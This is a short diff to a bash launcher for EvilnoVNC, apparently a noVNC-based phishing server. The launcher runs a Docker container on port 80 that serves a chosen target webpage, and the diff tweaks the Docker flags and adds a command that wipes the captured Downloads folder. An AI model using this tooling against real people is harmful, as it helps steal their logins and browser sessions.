@@ -39,11 +39,14 @@ if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi
 
 if [[ $RESOLUTION == dynamic ]]; then
-sudo docker run --cap-add=SYS_ADMIN --device /dev/dri -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
+sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
+-v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1
 
 else echo $RESOLUTION > /tmp/resolution.txt
-sudo docker run --cap-add=SYS_ADMIN --device /dev/dri -d --rm -p 80:80 -v "/tmp:/tmp" -v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi
+sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
+-v "${PWD}/Downloads":"/home/user/Downloads" -e "WEBPAGE=$WEBPAGE" --name evilnovnc joelgmsec/evilnovnc > /dev/null 2>&1 ; fi
 
+rm -Rf $PWD/Downloads/*
 printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 2
 printf "\n\e[1;34m[+] URL: http://localhost" ; sleep 2
 printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2
